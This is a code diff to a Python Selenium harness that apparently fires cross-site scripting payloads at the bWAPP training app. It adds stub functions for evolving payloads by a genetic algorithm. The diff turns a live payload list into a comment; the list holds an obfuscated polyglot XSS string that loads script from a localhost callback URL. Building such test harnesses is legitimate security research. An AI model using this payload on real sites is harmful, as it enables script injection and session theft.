@@ -44,7 +44,7 @@ def compare_images(img_str1, img_str2):
     img2 = cv2.imread(img_str2)
     return np.sum((img1 - img2) ** 2) # calc medium squared error
 
-def experiment_iteration(driver: webdriver, payloads: list[str], experiment_function: Callable[[webdriver, str, str], str]) -> any:
+def experiment_on_function(driver: webdriver, payloads: list[Payload], experiment_function: Callable[[webdriver, str, str], str]) -> any:
     # set login cookie for driver
     driver.maximize_window()
     login(driver, BWAPP_URL)
@@ -128,10 +128,31 @@ def experiment_iteration(driver: webdriver, payloads: list[str], experiment_func
                        )
         conn.commit()
 
-payloads = ["\"<ScRiPt sRc=`http://localhost:5000/submit/<id>`></ScRiPt>nOeMbed><ScRiPt sRc='http://localhost:5000/submit/<id>'></ScRiPt>\"&gt;import(`http://localhost:5000/submit/<id>`) <!--hTmL>' oNLoAd= )texTarEa&gt;<iMg-<ScRiPt sRc=`http://localhost:5000/submit/<id>`></ScRiPt> oNFoCus=*/';/ifRaMe>hTmL> oNtOgGle=/*`>/sOurCe&gt; oNmOuSeLeaVe= > OnBlUr= <ScRiPt sRc='http://localhost:5000/submit/<id>'></ScRiPt>iMg/* onClICk=import(\"http://localhost:5000/submit/<id>\")", "sane"]
+
+def evaluate_results():
+    #TODO return best candidates
+    return [Payload()]
+
+def evolve_population(candidates: [Payload], population_size: int):
+    # TODO mutate candidates / generate new / select randomly
+    return [Payload()]
+
+def run(experiment_functions: [Callable[[webdriver, str, str], str]], population_size: int = 50, iterations: int = 10):
+    payload_population = [Payload() for _ in range(population_size)]
+    driver = webdriver.Chrome()
+    for _ in range(iterations):
+        for func in experiment_functions:
+            experiment_on_function(driver, payload_population, func)
+        candidates = evaluate_results()
+        payload_population = evolve_population(candidates, population_size)
+    # TODO print results
+
+# payloads = ["\"<ScRiPt sRc=`http://localhost:5000/submit/<id>`></ScRiPt>nOeMbed><ScRiPt sRc='http://localhost:5000/submit/<id>'></ScRiPt>\"&gt;import(`http://localhost:5000/submit/<id>`) <!--hTmL>' oNLoAd= )texTarEa&gt;<iMg-<ScRiPt sRc=`http://localhost:5000/submit/<id>`></ScRiPt> oNFoCus=*/';/ifRaMe>hTmL> oNtOgGle=/*`>/sOurCe&gt; oNmOuSeLeaVe= > OnBlUr= <ScRiPt sRc='http://localhost:5000/submit/<id>'></ScRiPt>iMg/* onClICk=import(\"http://localhost:5000/submit/<id>\")", "sane"]
+EXPERIMENT_FUNCTIONS = [xss_reflected_eval, xss_reflected_get_firstname] # TODO add all
 
 if __name__ == '__main__':
-    driver = webdriver.Chrome()
+    run(EXPERIMENT_FUNCTIONS)
+    #driver = webdriver.Chrome()
     #payloads = [generate_payload() for _ in range(1, 50)]
     #single_experiment(driver, payloads, xss_reflected_eval)
-    experiment_iteration(driver, payloads, xss_reflected_get_firstname)
+    #experiment_on_function(driver, payloads, xss_reflected_get_firstname)
